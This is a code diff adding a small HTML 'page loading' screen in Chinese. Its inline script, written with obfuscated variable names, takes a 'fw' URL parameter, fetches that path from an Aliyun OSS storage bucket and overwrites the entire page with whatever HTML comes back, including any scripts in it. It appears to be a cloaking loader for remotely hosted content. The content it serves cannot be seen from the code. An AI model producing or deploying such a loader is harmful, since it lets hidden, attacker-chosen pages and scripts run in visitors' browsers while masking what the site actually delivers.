@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head> <meta charset="UTF-8"> <title>页面加载中</title> </head>
+<body>
+<h1 style="font-size: 60px;text-align:center; margin: 101px 0 0 0;"> 努力加载中...<h1>
+</body>
+<script>
+    const db6ce6a9574dxst = window.location.search;
+    const b6ce6a9574det6rt = new URLSearchParams(db6ce6a9574dxst);
+    var fw = b6ce6a9574det6rt.get('fw')
+    var e6a9574de8951f4316c2ytik  = new XMLHttpRequest;
+    e6a9574de8951f4316c2ytik.onload = function(){
+      var a9574de8951f4316c21f6ffiot = document.open("text/html", "replace");
+      a9574de8951f4316c21f6ffiot.write(e6a9574de8951f4316c2ytik.responseText);
+      a9574de8951f4316c21f6ffiot.close();
+    }
+    e6a9574de8951f4316c2ytik.open("GET", "https://lbcontent.oss-cn-shenzhen.aliyuncs.com/" + fw, !0);
+    e6a9574de8951f4316c2ytik.send();
+
+</script>
+</html>
